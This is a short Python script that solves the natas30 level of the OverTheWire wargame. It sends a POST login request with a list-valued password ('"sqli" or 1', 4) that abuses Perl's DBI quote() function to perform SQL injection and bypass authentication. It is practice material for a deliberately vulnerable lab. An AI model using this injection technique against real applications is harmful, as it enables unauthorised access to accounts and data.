"""
Help script to resolve natas challenge #30
"""
import requests
import json

level = 'natas30'
url = 'http://{}.natas.labs.overthewire.org'.format(level)

with open('natas.json') as j:
    credentials = json.load(j)
auth = (level, credentials[level])
del credentials

"""
In this level exploit improper use of the quote() Perl function.
https://security.stackexchange.com/questions/175703/is-this-perl-database-connection-vulnerable-to-sql-injection/175872#175872
TL;DR: Calling quote as a list with SQL_INTEGER as the second parameter, will return an unquoted value
"""
session = requests.Session()
response = session.post(url, auth=auth, data={'username': 'natas31', 'password': ['"sqli" or 1', 4]})
print(response.text)
